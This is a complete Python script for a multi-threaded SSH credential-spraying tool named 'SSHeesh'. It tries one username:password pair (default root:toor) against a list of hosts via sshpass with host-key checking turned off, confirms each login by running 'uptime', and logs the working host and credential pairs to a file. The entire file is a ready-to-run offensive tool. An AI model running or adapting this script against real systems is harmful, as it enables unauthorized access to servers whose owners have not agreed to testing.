#!/usr/bin/env python3

import argparse
import os
import shutil
import subprocess
import sys

from threading import Thread
from queue import Queue

os.environ["PYTHONUNBUFFERED"] = "1"

Description = """
SSHeesh - a multi-threaded red team utility for SSH credential spraying
"""

class SSHPray:
	def __init__(self):
		self.ip = "127.0.0.1"
		self.is_list = False
		self.list_file = None
		self.list = None
		self.total_num = 1
		self.num_done = 0
		self.output = "stdout.txt"
		self.port = "22"
		self.creds = "root:toor"
		self.username = "root"
		self.password = "toor"
		self.threads = 1
		self.timeout = "3"

	@staticmethod
	def dependency_check():
		required_cmds = ['ssh', 'sshpass', 'timeout']
		for cmd in required_cmds:
			if not shutil.which(cmd):
				print(f"ERROR: '{cmd}' is not in the $PATH or is not installed/available on this OS.")
				exit(os.EX_OSERR)
		return True

	@staticmethod
	def get_chunks(l: list, n: int):
		n = max(1, n)
		return (l[i:i + n] for i in range(0, len(l), n))

	def ssh_connect(self, q: Queue):
		try:
			while True:
				ip = q.get()
				self.num_done += 1
				percent_done = round((self.num_done / self.total_num) * 100, 2)
				print(f"[{percent_done}%] Trying {ip}...\033[K\r", end='')
				try:
					cmd = ["timeout", self.timeout, "sshpass", "-p", self.password, "ssh", "-oStrictHostKeyChecking=no",
					       "-p", self.port, f"{self.username}@{ip}", "uptime"]
					ssh = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					output = str(ssh.communicate())
					rc = ssh.returncode
					if rc == 0 and 'load average' in output:
						msg = f"{ip}:{self.port} {self.creds}"
						print(f"{msg}\033[K")
						with open(self.output, 'a') as f:
							f.write(f"{msg}\n")
				except KeyboardInterrupt:
					print("\nCaught KeyboardInterrupt. Exiting...")
					sys.exit()
				except OSError:
					print("You probably have too many open file handles to run with this many threads")
					print("Try setting `ulimit -n unlimited` or to at least twice the number of threads you are passing to this script")
					exit(os.EX_OSERR)
				finally:
					q.task_done()
		except KeyboardInterrupt:
			print("\nCaught KeyboardInterrupt. Exiting...")
			sys.exit()

	def do_work(self):
		try:
			if self.is_list:
				with open(self.list_file, 'r') as f:
					self.list = [line.strip() for line in f.readlines() if line]
			else:
				self.list = [self.ip]
			self.total_num = len(self.list)
			self.username = self.creds.split(':')[0]
			self.password = self.creds.split(':')[1]
			chunks = list(self.get_chunks(self.list, self.threads))
			q = Queue()
			for i in range(self.threads):
				thread = Thread(target=self.ssh_connect, args=(q,))
				thread.daemon = True
				thread.start()
			for i in range(0, len(chunks)):
				for j in chunks[i]:
					q.put(j)
			q.join()
		except KeyboardInterrupt:
			print("\nCaught KeyboardInterrupt. Exiting...")
			sys.exit()


def usage():
	print("Run with '-h' to see help info")
	sys.exit()


if __name__ == '__main__':
	# Change to script directory:
	script_path = os.path.dirname(os.path.abspath(__file__))
	os.chdir(script_path)
	s = SSHPray()
	# Parse Arguments:
	if not sys.argv[1:]:
		usage()
	arguments = sys.argv[1:]
	parser = argparse.ArgumentParser(description=Description, formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('-i', '--ip', help="for use with a single IP address, which can sometimes be useful")
	parser.add_argument('-iL', '--list', help="/path/to/ip_list")
	parser.add_argument('-c', '--creds', help="delimited credential string [username:password]")
	parser.add_argument('-k', '--kill', help="kill running processes", action="store_true")
	parser.add_argument('-o', '--output', help="/path/to/output_file to save successful attempts", default="stdout.txt")
	parser.add_argument('-p', '--port', help="TCP port to use (default: 22)", default="22")
	parser.add_argument('-t', '--threads', help="number of threads to use", default="1")
	parser.add_argument('-T', '--timeout', help="TCP connection timeout", default="3")
	args = parser.parse_args(arguments)
	if args.kill:
		os.system("ps aux | grep sheesh | grep python | grep -v '\-k' | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1")
		sys.exit()
	s.ip = args.ip
	s.list_file = args.list
	s.creds = args.creds
	s.output = args.output
	s.port = args.port
	s.threads = int(args.threads)
	s.timeout = args.timeout
	# Create/clear output file:
	with open(s.output, 'w'):
		pass
	if s.ip:
		s.threads = 1
		s.list = s.ip
	elif s.list_file:
		s.is_list = True
		if not os.path.isfile(s.list_file):
			print("ERROR: can't find input list")
			sys.exit()
	else:
		print("ERROR: Must pass either '--ip [ip_address] or --list [/path/to/ip_list]'")
		sys.exit()
	ulimit = int(os.popen('ulimit -n').read())
	if s.threads >= ulimit:
		print("In order to safely run this script without encountering open file handle issues,")
		print("please run 'ulimit -n unlimited' before running this script.")
		sys.exit()
	try:
		if s.dependency_check():
			s.do_work()
	except KeyboardInterrupt:
		print("\nCaught KeyboardInterrupt. Exiting...")
		sys.exit()

